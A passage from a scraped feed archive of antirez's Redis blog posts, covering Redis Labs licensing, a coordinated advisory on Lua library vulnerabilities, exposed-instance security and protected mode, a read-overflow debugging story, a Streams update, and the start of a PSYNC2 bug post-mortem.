<br>However at Redis Labs we observed multiple times that it’s a bit a shame that Redis cannot solve certain specific problems. For instance what about if Redis was a serious full text search engine? Also well, developers want so much JSON, what about having an API to talk directly JSON? And given that in-memory graphs if represented wisely can be so fast, what about having graph database abilities, with a rich query language? Redis Labs customers often asked directly for such things. And actually, such features could be cool, but it’s not Redis, I’m not interested, and the open source side of Redis does not have the development force to keep all this things going btw. And this is a major advantage both for Redis and for Redis Labs: it is relatively cheap to pay just me and a few more OSS development time internally, while allocating the rest of the resources to development of things that are useful for the Redis Labs business, like making sure the Redis enterprise SaaS and products are good. There is anyway a great deal of contributions arriving from the community. And I also keep saying “no” to all this fancy ideas that would keep Redis in other areas… which is also a problem.
<br>
<br>Still to have such things similar to Redis but outside the Redis scope, would be cool, because you know, while it’s not Redis mission, people may very well use a fast inverted index with full text search capabilities that you can feed in real time, while it serves a very good amount of queries per core at the same time. This is what Redis Labs is doing, it’s using the same Redis technology and approach to do more than what Redis wanted to do. Not just in the functionality areas, but also in other areas like consistency models. I’m very opinionated about certain things, and I think that, for instance, CRDTs while super cool in certain use cases, where not the right thing for Redis, to retain the same memory footprint, performance, simplicity, even at the cost of having a weaker consistency model. So Redis Labs, together with a top researcher in the area, did it (and this is a proprietary product without any source available). I can see how such feature can be tremendously useful for certain operations, but Redis was not there to solve everything, and Redis Labs did it.
<br>
<br>This is not open core. Redis Labs is doing things that you would never see from me: for bandwidth, and because I believe that not all the softwares must eventually become huge.
<br>So I think that calling this model “open core” is misleading, nothing is removed from the Redis table, just new things are explored, while trying to follow the “Redis way” in other areas otherwise not touched by the Redis project.
<a href=\"http://antirez.com/news/121\">Comments</a>" nil "http://antirez.com/news/121" "fc23c015cad35457021fdd4be58eac0a") (73 (26588 31767 71637 698000) "http://antirez.com/news/120
" "Redis will remain BSD licensed " nil "Wed, 22 Aug 2018 13:45:52 +0000" "Today a page about the new Common Clause license in the Redis Labs web site was interpreted as if Redis itself switched license. This is not the case, Redis is, and will remain, BSD licensed. However in the era of [edit] uncontrollable spreading of information, my attempts to provide the correct information failed, and I’m still seeing everywhere “Redis is no longer open source”. The reality is that Redis remains BSD, and actually Redis Labs did the right thing supporting my effort to keep the Redis core open as usually.
<br>
<br>What is happening instead is that certain Redis modules, developed inside Redis Labs, are now released under the Common Clause (using Apache license as a base license). This means that basically certain enterprise add-ons, instead of being completely closed source as they could be, will be available with a more permissive license.
<br>
<br>I think that Redis Labs Common Clause page did not provide a clear and complete information, but software companies often make communication errors, it happens. To me however, it looks more important that while running a system software business in the “cloud era” (LOL) is very challenging using an open source license, yet Redis Labs totally understood and supported the idea that the Redis core is an open source project, in the *most permissive license ever*, that is, BSD, and during the years provided a lot of funding to the project.
<br>
<br>The reason why certain modules developed internally at Redis Labs are switching license, is because they are added value that Redis Labs wants to be able to provide only to end users that are willing to compile and install the system themselves, or to the Redis Labs customers using their services. But it’s not ok to give away that value to everybody willing to resell it. An example of such module is RediSearch: it was AGPL and is now going to be Apache + Common Clause.
<br>
<br>About myself, I’ll keep writing BSD code for Redis. For Redis modules I’ll develop, such as Disque, I’ll pick AGPL instead, for similar reasons: we live in a “Cloud-poly”, so it’s a good idea to go forward with licenses that will force other SaaS companies to redistribute back their improvements. However this does not apply to Redis itself. Redis at this point is a 10 years collective effort, the base for many other things that we can do together, and this base must be as available as possible, that is, BSD licensed.
<br>
<br>We at Redis Labs are sorry for the confusion generated by the Common Clause page, and my colleagues are working to fix the page with better wording.
<a href=\"http://antirez.com/news/120\">Comments</a>" nil "http://antirez.com/news/120" "bf114f7d500dd0d0b7056a1b351bc703") (72 (26588 31767 71439 702000) "http://antirez.com/news/119
" "Redis Lua scripting: several security vulnerabilities fixed " nil "Wed, 13 Jun 2018 17:15:05 +0000" "A bit more than one month ago I received an email from the Apple Information Security team. During an auditing the Apple team found a security issue in the Redis Lua subsystem, specifically in the cmsgpack library. The library is not part of Lua itself, it is an implementation of MessagePack I wrote myself. In the course of merging a pull request improving the feature set, a security issue was added. Later the same team found a new issue in the Lua struct library, again such library was not part of Lua itself, at least in the release of Lua we use: we just embedded the source code inside our Lua implementation in order to provide some functionality to the Lua interpreter that is available to Redis users. Then I found another issue in the same struct package, and later the Alibaba team found many other issues in cmsgpack and other code paths using the Lua API. In a short amount of time I was sitting on a pile of Lua related vulnerabilities.
<br>
<br>Those vulnerabilities are mostly relevant in the specific case of providing managed Redis severs on the cloud, because it is very unlikely that the vulnerabilities discovered can be used without direct access to the Redis server: many Redis users don’t use the cmsgpack or the struct package at all, and who does will very unlikely feed them with untrusted input. However for cloud providers things are different: they have Redis instances, sometimes in multi tenancy setups, exposed to the user that subscribed for the service. She or he can send anything to such Redis instances, triggering the vulnerabilities, corrupting the memory, violating the Redis process, and potentially taking total control of the Redis process.
<br>
<br>For instance this simple Python program can crash Redis using one of the cmsgpack vunlerabilities [1].
<br>
<br>[1] https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a
<br>
<br>However from the point of view of normal Redis users that control what is sent to their instances, the risk is limited to feeding untrusted data to a function like struct.unpack(), after selecting a particularly dangerous decoding format “bc0” in the format argument.
<br>
<br># Coordinating the advisory
<br>
<br>Thanks to the cooperation and friendly communications between the Apple Information Security team, me, and the Redis cloud providers, I tried to coordinate the release of the vulnerability after contacting all the major Redis providers out there, so that they could patch their systems before the bug was published. I provided a single patch, so that the providers could easily apply it to their systems. Finally between yesterday and today I prepared new patch releases of Redis 3, 4 and 5, with the security fixes included. They are all already released if you are reading this blog post. Unfortunately I was not able to contact smaller or newer cloud providers. The effort to handle the communication with Redis Labs, Amazon, Alibaba, Microsoft, Google, Heroku, Open Redis and Redis Green was already massive, and the risk of leaks extending the information sharing with other subjects even higher (every company included many persons handling the process). I’m sorry if you are a Redis provider finding about this vulnerability just today, I tried to do my best.
<br>
<br>I want to say thank you to the Apple Information Security team and all the other providers for the hints and help about this issue.
<br>
<br># The problem with Lua
<br>
<br>Honestly when the Redis Lua engine was designed, it was not conceived with this security model of the customer VS the cloud provider in mind. The assumption kinda was that you can trust who pokes with your Redis server. So in general the Lua libraries were not scrutinized for security. The feeling back then was, if you have access to Redis API, anyway you can do far worse.
<br>
<br>However later things evolved, and cloud providers restricted the API of Redis to expose to their customers, so that it was possible to provide managed Redis instances. However while things like the CONFIG or DEBUG commands were denied, you can’t really avoid exposing EVAL and EVALSHA. The Redis Lua scripting is one of the top used features in our community.
<br>
<br>So gradually, without me really noticing, the Lua libraries became also an attack vector in a security model that should instead be handled by Redis, because of the changing system in the way Redis is exposed and provided to the final user. As I said, in this model more than the Redis user, is the managed Redis “cloud” provider to be affected, but regardless it is a problem that must be handled.
<br>
<br>What we can do in order to improve the current state of cloud providers security, regarding the specific problem with Lua scripting? I identified a few things that I want to do in the next months.
<br>
<br>1. Lua stack protection. It looks like Lua can be compiled, with some speed penalty, in a way that ensures that it is not possible to misuse the Lua stack API. To be fair, I think that the assumptions Lua makes about the stack are a bit too trivial, with the Lua library developer having to constantly check if there is enough space on the stack to push a new value. Other languages at the same level of abstraction have C APIs that don’t have this problem. So I’ll try to understand if the slowdown of applying more safeguards in the Lua low level C API is acceptable, and in that case, implement it.
<br>
<br>2. Security auditing and fuzz testing. Even if my time was limited I already performed some fuzz testing in the Lua struct library. I’ll continue with an activity that will check for other bugs in this area. I’m sure there are much more issues, and the fact that we found just a given set of bugs is only due to the fact that there was no more time to investigate the scripting subsystem. So this is an important activity that is going to be performed. Again at the end of the activity, I’ll coordinate with the Redis vendors so that they could patch in time.
<br>
<br>3. From the point of view of the Redis user, it is important that when some untrusted data is sent to the Lua engine, an HMAC is used in order to ensure that the data was not modified. For instance there is a popular pattern where the state of an user is stored in the user cookie itself, to be later decoded. Such data may later be used as input for Redis Lua functions. This is an example where an HMAC is absolutely needed in order to make sure that we read what we previously stored.
<br>
<br>4. More Lua sandboxing. There should be plenty of literature and good practices about this topic. We already have some sandboxing implemented, but my feeling from my security days, is that sandboxing is ultimately always a mouse and cat game, and can never be executed in a perfect way. CPU / memory abuses for example may be too complex to track for the goals of Redis. However we should at least be sure that violations may result in a “graceful” abort without any memory content violation issue.
<br>
<br>5. Maybe it’s time to upgrade the Lua engine? I’m not sure if newer versions of Lua are more advanced from the point of view of security, however we have the huge problem that upgrading Lua will result in old script potentially no longer working. A very big issue for the Redis community, especially since, for the kind of scripts Redis users normally develop, a more advanced Lua version is only marginally useful.
<br>
<br># The issues
<br>
<br>The problems fixed are listed in the following commits:
<br>
<br>ce17f76b Security: fix redis-cli buffer overflow.
<br>e89086e0 Security: fix Lua struct package offset handling.
<br>5ccb6f7a Security: more cmsgpack fixes by @soloestoy.
<br>1eb08bcd Security: update Lua struct package for security.
<br>52a00201 Security: fix Lua cmsgpack library stack overflow.
<br>
<br>The first commit is unrelated to this effort, and is a redis-cli buffer overflow that can be exploited only passing a long host argument in the command line. The other issues are the problems that we found on cmsgpack and the struct package.
<br>
<br>The two scripts to reproduce the issues are the following:
<br>
<br>https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a
<br>
<br>and
<br>
<br>https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035
<br>
<br>Both authored by the Apple Information Security team. However the first was modified by me in order to make it more reliably causing the crash.
<br>
<br># Versions affected
<br>
<br>Basically every Redis with Lua scripting is affected.
<br>
<br>The fixes are available as the following Github tags:
<br>
<br>3.2.12
<br>4.0.10
<br>5.0-rc2
<br>
<br>The stable release (4.0.10) is also available at http://download.redis.io as usually.
<br>
<br>Releases tarball hashes are available here:
<br>
<br>https://github.com/antirez/redis-hashes
<br>
<br>Please note that the versions released also include different other bugfixes, so it’s a good idea to also read the release notes to know what other things you are upgrading by switching to the new version.
<br>
<br>I hope to be back with a blog post in the future with the report of the security auditing that is planned for the Lua scripting subsystem in Redis.
<a href=\"http://antirez.com/news/119\">Comments</a>" nil "http://antirez.com/news/119" "b12369a753330f65bb0d06b81fd43f14") (71 (26588 31767 70934 796000) "http://antirez.com/news/118
" "Clarifications on the Incapsula Redis security report " nil "Sat, 02 Jun 2018 17:52:39 +0000" "A few days ago I started my day with my Twitter feed full of articles saying something like: “75% of Redis servers infected by malware”. The obvious misquote referred to a research by Incapsula where they found that 75% of the Redis instances left open on the internet, without any protection, on a public IP address, are infected [1].
<br>
<br>[1] https://www.incapsula.com/blog/report-75-of-open-redis-servers-are-infected.html
<br>
<br>Many folks don’t need any clarification about all this, because if you have some grip on computer security and how Redis works, you can contextualize all this without much efforts. However I’m writing this blog post for two reasons. The obvious one is that it can help the press and other users that are not much into security and/or Redis to understand what’s going on. The second is that the exposed Redis instances are a case study about safe defaults that should be interesting for the security circles.
<br>
<br>The Incapsula report
<br>===
<br>
<br>Let’s start with the Incapsula report. What they did was to analyze exposed Redis instances on the internet. Instances that everybody from any place of the internet can access, because they are listening for connections in a public IP address, without any password protecting them. It is like if they were HTTP servers, but it’s Redis instead, that is not designed to be left exposed.
<br>
<br>This is far from a new story. Because of Redis popularity the number of total Redis installations is pretty huge, and a fraction of these installations are left exposed. It’s like that since the start basically. People spin a virtual machine in some cloud provider, install Redis, find that they cannot access it, open the port of the VM to anyone, and the instance is at this point running unprotected. They only thing that changed is that most of those instances in the past were left running unaffected in many cases. Maybe some script kiddie could connect and call “INFO” or a few more commands to check what there was inside, and that was it most of the times. Now the new crypto mining obsession is providing attackers a very good reason to break into other people’s systems. Actually the best of the reasons: money. So the same exposed instances are now cracked in order to install some software to mine some kind of crypto currency. Incapsula checked the percentage of instances that look violated.
<br>
<br>The way they collected the kind of attacks used against Redis instances was by running, on purpose, a set of exposed instances, to monitor how the attackers could target them. Many of the attacks look like variations on my own example attack [2].
<br>
<br>[2] http://antirez.com/news/96
<br>
<br>Also it is worth to note that to scan the IPv4 address space in order to find exposed instances of any kind of service is trivial. You could use, for instance, masscan. However you could do that 20 years ago using my own hping, and I remember doing this back then with success indeed.
<br>
<br>TLDR: there are open Redis instances on the internet because they are misconfigured. Attackers profit from them by installing some kind of mining software, or for other reasons. But there is more… keep reading.
<br>
<br>Protected mode
<br>===========
<br>
<br>Security is a terrible field in my opinion. I worked in such field, and decided to go away once it started to be no longer an underground affair. People are very opinionated about security issues, while, at the same time, there is little real care about, for instance, performing security auditings on real world systems (something that Google project zero is changing a bit, btw). So after receiving for the Nth time some PGP encrypted email saying that Redis was vulnerable to a temp file creation attack, I wrote the blog post at [2], just to tell: “maybe you are missing the point of Redis security”. I basically published an attack against my own system that I could find in a few minutes of research, and that was very serious. The message was, again, Redis is not designed to be left exposed. And if you really want to play hack3rzzz look, there are more interesting things to do. However by doing that I put on the hands of script kiddies a great weapon to break into thousands of Redis instances open everywhere.
<br>
<br>In order to pay back from my fault, in an attempt to atone my sin, I started to think about what I could do to make the situation simpler. One problem of Redis 3.x was that by default it would listen to all the IP addresses, so it was simple to misconfigure: just open the port, or have no firewalling at all, and the instance is exposed. The security mantra about that was “run with safe defaults”. That is, in the case of Redis, a networked cache, to have a default configuration that basically more or less does not work for most real world users out of the box. And what was worse, people that don’t have a clue would just “bind *” to fix the problem, and we are back at the initial condition. So I tried to find something a bit smarter, a feature that I named “protected mode”, with great disappointment of a group of 386 processors that manifested in front of my houses for days.
<br>
<br>The idea of protected mode is to listen to every address, but if the connection is not local, the server replies with an error explaining *why* it is not working as expected, what to do, and the risks involved in just doing the silly thing of opening the instance to everybody by disabling protected mode. This is an example of how the feature works:
<br>
<br>$ nc 192.168.1.194 6379
<br>-DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command 'CONFIG SET protected-mode no' from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to 'no', and then restarting the server. 3) If you started the server manually just for testing, restart it with the '--protected-mode no' option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.
<br>
<br>The advantage here is that:
<br>
<br>1. The user knows what to do in order to fix this situation. It’s much better than “connection refused”.
<br>
<br>2. We try to avoid that the user disables protected mode without understanding what is the risk involved, and that there are other solutions (setting a password or binding to certain interfaces).
<br>
<br>Disillusion
<br>========
<br>
<br>So my illusion was that, maybe, it could be more helpful than the safe defaults. But unfortunately you can’t fix the fact that a percentage of users just don’t care, that some don’t even know they are installing Redis, and that it’s there just as a side effect of being a dependency for something else, or is installed by a script, or is included in the ABI image you are running and so forth.
<br>
<br>Initially by grepping on Shodan it looked like Redis 4.0 protected mode was, actually, helping quite a lot! The open instances I could find replied “-DENIED” for the most part. That was great. However after the publication of [1] I asked Shodan (btw they rock and were super helpful on Twitter) if I could have the version breakdown of the exposed Redis instances. And the result is, there are still tons of Redis 4.0 instances exposed [3].
<br>
<br>[3] https://asciinema.org/a/8heQvivQkFmUrisbb9FQLfMBj
<br>
<br>It is true that they are less than the 3.0 instances, but they are still a lot. By investigating more I was even told that there are VM images where Redis protected mode is *removed* by the installation script by default, since sometimes people are annoyed by security features. They want things to just work over the network out of the box, so this is what they do, remove the annoyance. Then such image becomes popular, and many folks install it without knowing what’s going on, and when Redis 4 is installed protected mode is off and the instance is exposed.
<br>
<br>I think this is a lesson about safe defaults that can be trivially disabled by users. It looks like that in some way they could help, but just in reducing by some percentage the number of incidents, not to make them a rare exception.
<br>
<br>What’s next?
<br>=========
<br>
<br>One of the fundamental problems in the Redis security model is that the server can be reconfigured via the normal API, using special commands like the CONFIG command. This is a very valuable feature of Redis, but it makes much simpler to break into the instance once you have access to the Redis API, and normal applications using Redis don’t need this level of access.
<br>
<br>So in the course of Redis 6, what will happen is that we’ll introduce ACLs. Again, the way this feature will be introduced will try to be a “no pain” experience for existing users. If you connect without any credential, Redis will log in the client automatically using the “default” user, that can do everything applications normally do, but will deny all the administrative commands. Of course it will be possible to make it more strict by configuring things differently, create new users that can only call certain commands on keys matching a given pattern, and so forth.
<br>
<br>In the course of Redis 6 we plan to also merge support for SSL connections, while this is unlikely to have any impact on the issue discussed here, because by default Redis will run unencrypted and the feature will be opt-in, however SSL is also one step forward for a more secure Redis experience in certain environments.
<br>
<br>However my hopes are on ACLs, because it looks unlikely that the casual user will make the default account able to run the administrative commands. Especially because we plan to log connections originating from the local host as the “admin” user directly. If this goes as I hope, we’ll continue to see Redis 6 instances exposed, because it is inevitable, but at least those Redis 6 instances should make it harder to compromise the whole system. At least in theory: Redis EVAL command allows execution of Lua scripts, and such feature should be allowed by default since is a fundamental Redis feature. We try to have a kinda sandboxed Lua execution environment, but if you followed IT security for some time, you know that sandboxes are always imperfect, and more an exercise in finding how to escape them than a sealing solution. This time however I’ll avoid publishing an attack just to make a point.
<a href=\"http://antirez.com/news/118\">Comments</a>" nil "http://antirez.com/news/118" "a1f8fd153bbc425ae4ff9bca14013fc4") (70 (26588 31767 70354 317000) "http://antirez.com/news/117
" "A short tale of a read overflow " nil "Wed, 07 Feb 2018 20:30:39 +0000" "[This blog post is also experimentally available on Medium: https://medium.com/antirez/a-short-tale-of-a-read-overflow-b9210d339cff]
<br>
<br>When a long running process crashes, it is pretty uncool. More so if the process happens to take a lot of state in memory. This is why I love web programming frameworks that are able, without major performance overhead, to create a new interpreter and a new state for each page view, and deallocate every resource used at the end of the page generation. It is an inherently more reliable programming paradigm, where memory leaks, descriptor leaks, and even random crashes from time to time do not constitute a serious issue. However system software like Redis is at the other side of the spectrum, a side populated by things that should never crash.
<br>
<br>Months ago I received a crash report from my colleague Dvir Volk. He was developing his RediSearch Redis module, so it was not clear if the crash was due to a programming error inside the module, perhaps corrupting the heap, or a bug inside Redis. However it looked a lot like a real problem into the radix tree implementation:
<br>
<br>=== REDIS BUG REPORT START: Cut & paste starting from here ===
<br># Redis 999.999.999 crashed by signal: 11
<br># Crashed running the instuction at: 0x7fceb6eb5af5
<br># Accessing address: 0x7fce9c400000
<br>| Backtrace:
<br>| redis-server *:7016 [cluster](raxRemoveChild+0xd3)[0x49af53]
<br>| redis-server *:7016 [cluster](raxRemove+0x34f)[0x49b34f
<br>| redis-server *:7016 [cluster](slotToKeyUpdateKey+0x1ad)[0x4415dd]
<br>
<br>The radix tree is full of memmove() calls, and Redis crashed exactly trying to access a memory address that was oddly zero padded at the end: 0x7fce9c400000. My first thought was, I’m sure I’m doing some wrong memory movement here, and the address gets overwritten with zeroes, leading to the crash when the program attempts the deference the address.
<br>
<br>I’m pretty proud about my radix tree implementation. Not because of the implementation itself, while it’s a complex data structure to implement, it’s not rocket science. But because of the fuzz tester that comes with it and is able to cover the whole source code (trivial) and a lot of non trivial state (that’s definitely more interesting). The fuzz tester does not do fuzzing just to reach a crash, it compares the implementation of the radix tree dictionary and iterator with a reference implementation that uses an hash table and qsort, to have exactly the same semantics, but in a short and easy to audit implementation. After receiving the crash report I improved the fuzz tester, ran it for days, with and without Valgrind, wrote additional data models, created tests using 100 millions of keys, but despite the efforts I could not reproduce the crash. A few days ago I would discover that there was no bug in the implementation I was testing, but at the time I was not aware of that. I could simply never find a bug that was not there. So after failing to reproduce I gave up.
<br>
<br>One week ago I received two other additional bug reports that were almost the same. And again, the addresses were zero padded.
<br>
<br>Dvir crash: Accessing address: 0x7fce9c400000
<br>Issue 4605: Accessing address: 0x7f2959e00000
<br>Issue 4642: Accessing address: 0x7f0e9b800000
<br>
<br>It was time to read every memmove, memcpy, realloccall inside the source code, trying to figure out if there was something wrong that for some reason the fuzz tester was not able to catch. I found nothing, but then inspecting the Redis crash report I noticed something funny. During crashes Redis reports the memory mapped areas of the process, things like the following:
<br>
<br>*** Preparing to test memory region 7f0e8c400000 (255852544 bytes)
<br>
<br>Now, if you add 255852544to 0x7f0e8c400000, the result is 0x7f0e9b800000 , which is exactly the accessed address in the crash reported in issue 4642. So the program was not crashing because the memory address was corrupted, but because it was accessing an address immediately after the end of the heap. I checked the other issues, and the same was true in all the instances. Basically the end of the heap, at the edge of the start of unmapped addresses, was acting as a memory guard in order to detect and crash when an access was performed outside the bounds. This is a common technique that certain C memory sanitation tools used to employ in the past. Such tools would provide a drop in replacement formalloc() that would return addresses allocated at the edge of a non accessible memory page. Every overflow would be immediately detected in this way.
<br>
<br>Because the program would crash only in that case, when deallocating a radix tree node at the end of the heap, it was simple to realize that the problem was a read overflow. You can never detect a read overflow otherwise: it will just access data outside your structure, but inside mapped memory, so the bug would be totally harmless and silent, with the exception of doing the same operations at the end of the mapped region. Finally I had a clear place where to look, this portion of C code:
<br>
<br>/* 3. Remove the edge and the pointer by memmoving the remaining children pointer and edge bytes one position before. */
<br>int taillen = parent->size - (e - parent->data) - 1;
<br>debugf(\"raxRemoveChild tail len: %d\\n\", taillen);
<br>memmove(e,e+1,taillen);
<br>/* Since we have one data byte less, also child pointers start one byte before now. */
<br>memmove(((char*)cp)-1,cp,(parent->size-taillen-1)*sizeof(raxNode**));
<br>/* Move the remaining \"tail\" pointer at the right position
<br>as well. */
<br>size_t valuelen = (parent->iskey && !parent->isnull) ? sizeof(void*) : 0;
<br>memmove(((char*)c)-1,c+1,taillen*sizeof(raxNode**)+valuelen);
<br>/* 4. Update size. */
<br>parent->size--;
<br>
<br>I asked the user to send me the redis-server binary that produced the crash report, and reading the disassembled code it was clear that many CPU registers, also included in the Redis crash report, would be still populated with the variables above! Note that the CPU registers RDI, RSI, RDX are used in order to pass the first three arguments to memmove. In one of the crashes we had:
<br>
<br>parent = RBP = 7f2959dffff
<br>Checking RDI, RSI, RDX we extract the memmove() arguments:
<br>memmove(00007f2959dffff4,00007f2959dffffd,0000000000000008);
<br>The memmove will go out of bound accessing up to 7f2959e00004.
<br>
<br>So I had my proof. But there was more, checking other registers I could also reconstruct the node header, in order to understand how the memmove count argument was obtained. Something was definitely wrong there. Basically I was seeing that the disassembled executable did not match the C function I was reading. How was that possible? The read over the buffer should not happen, because the state was sane. Only the count was incorrectly computed by the crashing instance. It was night, and I had worked at this damn thing for two days no stop, so I decided to create a gist and post it on Twitter, to see if somebody could explain how such C would be turned into such assembler by the compiler.
<br>
<br>I was lucky enough that my friend Fedor Indutny of Node.js fame was willing to help. He quickly realized that it was very clear why the C and the assembler could not match: what I was analyzing was not the right C code… but a newer version of the same function. Fedor had a GCC 5.4.0 at hand, the same compiler used by the user reporting the bug, so he tried to compile an older version of the code with it, realizing that now the two versions of the emitted code matched perfectly. He pinged me about it, asking if I was sure that this was a recent Redis version. I was absolutely sure, it was Redis 4.0.6. But then I started to have a few doubts, and I took a diff of rax.c between the Redis unstable branch and Redis 4.0. What happened was that I fixed this bug about ten months ago, in the course of the Streams implementation. During the cherry picking activity, where bugfixes from unstable are backported to Redis 4.0, the fix was inside a commit about streams, so I was constantly skipping it. Everything was finally clear, I had debugged for days a bug that was not there in the version that I was testing.
<br>
<br>If it was just a lame mistake from me, why I did bother to write this blog post? Because, I believe, there are lessons to be learned from all this.
<br>
<br>The first lesson is that crash reports like the ones Redis is able to emit are a key asset in system software. They allow to reconstruct the state of bugs that you are not able to replicate, but happen very rarely on the wild. While the bug was already fixed, I was able to exactly understand what was happening just looking at the bug reports, register dumps, offending address, and call stack.
<br>
<br>The second lesson is that you should learn AMD64 assembler today, at least to read comfortably code emitted by the compiler and follow what is happening, if you want to get involved in system programming. This is often the only way to understand what is happening during an heisenbug. Debuggers won’t help much. GDB was claiming that the crash was happening in the instruction parent->size-- which is, of course impossible. But GDB is not to blame, modern compilers, with optimizations turned on, generate code that can hardly be matched back to the source code.
<br>
<br>Another lesson is how powerful well done fuzz testing is. The fuzz tester was immediately able to find the bug in the broken version. Similarly the fact that no radix tree crash was never observed other than this bug fixed a long time ago, speaks for itself. The radix tree implementation is very complex, yet thanks to fuzz testing there are apparently no bugs in the implementation which is so new and so complex. I want to stress the importance of doing fuzzing not just to find crashes: that’s good for security people that want to discover zero days. Fuzzing for system software should perform random operations according to a sane operation model, and compare the outcome with a reference implementation.
<br>
<br>And finally, there is a clear lesson for me: next time I need to be more carefully when working at a feature branch and making fixes that are not specific of the feature branch. I was working under the feeling that I would merge everything back into 4.0 ASAP. Then it was not the case, and putting the radix tree update into the same commit implementing Stream things was a fatal error.
<br>
<br>Well, bonus point, having smart friends help :-) I was a bit lost at that point, and the kind help of Fyodor helped realize the last part of the puzzle and quickly move forward. Don’t be afraid to ask for help. If you get involved in system software, remember that it is very different than other fields in programming. It’s not just that you do some work and you can bring things forward. You must be prepared to spend days trying to understand why a bug happened, a bug that often you are not able to reproduce, because users deserve more than software crashing like that.
<a href=\"http://antirez.com/news/117\">Comments</a>" nil "http://antirez.com/news/117" "b8e786e0195c0b4a06ab897236085e9c") (69 (26588 31767 69804 763000) "http://antirez.com/news/116
" "An update on Redis Streams development " nil "Thu, 25 Jan 2018 18:00:34 +0000" "I saw multiple users asking me what is happening with Streams, when they’ll be ready for production uses, and in general what’s the ETA and the plan of the feature. This post will attempt to clarify a bit what comes next.
<br>
<br>To start, in this moment Streams are my main priority: I want to finish this work that I believe is very useful in the Redis community and immediately start with the Redis Cluster improvements plans. Actually the work on Cluster has already started, with my colleague Fabio Nicotra that is porting redis-trib, the Cluster management tool, inside the old and good redis-cli. This step involves translating the code from Ruby to C. In the meantime, a few weeks ago I finished writing the Streams core, and I deleted the “streams” feature branch, merging everything into the “unstable” branch.
<br>
<br>Later I reviewed again, several times actually, the specification for consumer groups. A few weeks ago I finally was happy with the result, so I started the implementation of this specification: https://gist.github.com/antirez/68e67f3251d10f026861be2d0fe0d2f4. Be aware that command names changed quite a bit… With the API being more like this: https://gist.github.com/antirez/4e7049ce4fce4aa61bf0cfbc3672e64d.
<br>
<br>I’m halfway, after the first 500 lines of code I today was able to see clients using the XREADGROUP command to see only their local history when fetching old messages. This was a milestone in the implementation. Also XACK is now available. Basically all the data structures supporting the streams consumer groups are working, but I need to finish all the commands implementations, support the blocking operations in XREADGROUP and so forth, handle replication, RDB and AOF persistence. More or less in one month I should have everything ready.
<br>
<br>Because of consumer groups, the RDB format of the Streams is going to change a lot compared to what “unstable” is using right now. And since there is to break compatibility, we’ll also add the ability of RDB files to persist information about keys last access, so that a Redis restart (or slave loading) involving RDB will get all the info needed in order to continue doing the eviction of keys in the correct way. Right now all that information would be lost instead. Because of this radical RDB changes the plan changed a bit: Streams are going to appear in Redis 5.0 and not 4.0, but 5.0 will be released as GA in about two months: this is possible because 5.0 will be just a 4.0 plus streams, no other major features inside, if not for the RDB changes…
<br>
<br>So TLDR: I’m working to Streams almost full time, if not for some time to check PRs / Issues for critical stuff, and in two months if you upgrade to Redis 5.0 you’ll have production ready streams with consumer groups fully implemented. There is also quite of a documentation effort to perform, I’ll write both the command manuals and an extensive introduction to streams once we go RC1, which is in about one month, so that people will have documentation to support their tests during the release candidate stage.
<br>
<br>I hope this clarifies what’s happening with Streams. See you soon with Redis 5.0 :-)
<a href=\"http://antirez.com/news/116\">Comments</a>" nil "http://antirez.com/news/116" "cbfe9eee17617a914d8c12a8756981c8") (68 (26588 31767 69580 972000) "http://antirez.com/news/115
" "Redis PSYNC2 bug post mortem " nil "Sat, 02 Dec 2017 14:44:32 +0000" "Four days ago a user posted a critical issue in the Redis Github repository. The problem was related to the new Redis 4.0 PSYNC2 replication protocol, and was very critical. PSYNC2 brings a number of good things to Redis replication, including the ability to resynchronize just exchanging the differences, and not the whole data set, after a failover, and even after a slave controlled restart. The problem was about this latter feature: with PSYNC2 the RDB file is augmented with replication information. After a slave is restarted, the replication metadata is loaded back, and the slave is able to perform a PSYNC attempt, trying to handshake with the master and receive the differences since the last disconnection.
<br>
<br>All this is good news from the point of view of Redis operations, however while PSYNC2 was pretty solid since the introduction in Redis 4.0.0 stable, the feature involving a restarting slave was definitely lacking reliability. There were two problems with this feature: the first being that it was a last-minute addition to PSYNC2, and was not part of the original design document. It was more like an obvious extension of the work we did in PSYNC2, but was not scrutinized at the same level of the rest of the specification for potential bugs and issues. The second problem was due to the fact that the feature is more complex than it looks like initially, for the fact that it’s tricky to really restore *all* the state the replication has in the slave side after a restart. Moreover, failing to restore certain bits of the state, does not result in evident bugs most of the times, so they are hard to spot via integration testings. Only once specific conditions happen the lack of some state will result in problems. For instance failing to correctly reconstruct the currently selected DB in the slave replication state, will create problems only when there are writes happening in different Redis DBs, and such bug would not store correctly the currently selected DB only under special conditions.
<br>
<br>Thanks to the help of many Redis contributors, but especially thanks to the @soloestoy Github user, a Redis developer at Alibaba, recently we worked at improving a number of PSYNC2 potential issues. All the work done would finally end inside Redis 4.0.3 in a few days, after much testing of all the patches wrote so far. However once I received issue #4483, I understood I had to rush the release of Redis 4.0.3 because this was far more serious than the other Redis 4 PSYNC2 issues that we had discovered up to that point.
<br>
<br>The bug described in issue #4483 was fairly simple, yet very problematic. After a slave restart and a resulting reloading of the replication state from the RDB, the master replication backlog could contain Lua scripts executions in the form of EVALSHA commands. However the slave Lua scripting engine is flushed of all the scripts after the restart, so is not able to process such commands. This results in the slave not processing writes originated by Lua scripts, unless such scripts were using “commands replication”, which is not the default. The default is to replicate the script itself.
<br>
<br>I went a bit in panic mode… and wrote a few alternative patches that I submitted to the issue. At the end the one that did not require RDB incompatibilities with older versions was picked, so I went ahead and released Redis 4.0.3 ASAP. However I did a mistake… It’s a few weeks that I work from an office instead of working from home. Normally I do not work at night, but for 4.0.3, when I returned back home, I opened my home laptop and merged the patch into the 4.0 branch, and did some testing activity. The next day when I returned to the office, I continued working from another computer, but I did not realize that I was missing one commit that I merged at home, without pushing it to the repository.
<br>
